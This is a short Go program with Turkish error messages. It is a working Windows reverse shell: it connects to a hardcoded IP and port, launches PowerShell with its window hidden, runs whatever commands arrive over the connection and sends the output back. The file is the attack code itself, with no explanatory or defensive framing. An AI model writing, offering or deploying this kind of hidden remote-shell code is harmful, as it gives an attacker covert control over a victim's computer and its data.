package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os/exec"
	"strings"
	"syscall"
)

func main() {
	serverIP := "192.168.1.41"
	serverPort := "40000"
	reverseShell(serverIP, serverPort)
}

func reverseShell(serverIP, serverPort string) {
	conn, err := net.Dial("tcp", serverIP+":"+serverPort)
	if err != nil {
		fmt.Println("Bağlantı hatası:", err)
		return
	}
	defer conn.Close()
	startInteractiveShell(conn)
}

func startInteractiveShell(conn net.Conn) {
	cmd := exec.Command("powershell")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true, 
	}

	stdin, err := cmd.StdinPipe()
	if err != nil {
		fmt.Println(err)
		sendError(conn, "StdinPipe hatası: "+err.Error())
		return
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		fmt.Println(err)
		sendError(conn, "StdoutPipe hatası: "+err.Error())
		return
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		fmt.Println(err)
		sendError(conn, "StderrPipe hatası: "+err.Error())
		return
	}

	err = cmd.Start()
	if err != nil {
		fmt.Println(err)
		sendError(conn, "Komut başlatılamadı: "+err.Error())
		return
	}
	defer cmd.Wait()

	go handleOutput(stdout, stderr, conn)

	reader := bufio.NewReader(conn)
	for {
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
			sendError(conn, "Komut okuma hatası: "+err.Error())
			break
		}
		command = strings.TrimSpace(command)

		if command == "" {
			continue
		}

		_, err = stdin.Write([]byte(command + "\n"))
		if err != nil {
			fmt.Println(err)
			sendError(conn, "Komut yazma hatası: "+err.Error())
			break
		}
	}
}

func handleOutput(stdout, stderr io.Reader, conn net.Conn) {
	scanner := bufio.NewScanner(stdout)
	for scanner.Scan() {
		conn.Write([]byte(scanner.Text() + "\n"))
	}
	if err := scanner.Err(); err != nil {
		fmt.Println(err)
		sendError(conn, "Stdout okuma hatası: "+err.Error())
	}

	scanner = bufio.NewScanner(stderr)
	for scanner.Scan() {
		conn.Write([]byte("Hata: " + scanner.Text() + "\n"))
	}
	if err := scanner.Err(); err != nil {
		fmt.Println(err)
		sendError(conn, "Stderr okuma hatası: "+err.Error())
	}
}

func sendError(conn net.Conn, message string) {
	conn.Write([]byte("Hata: " + message + "\n"))
}
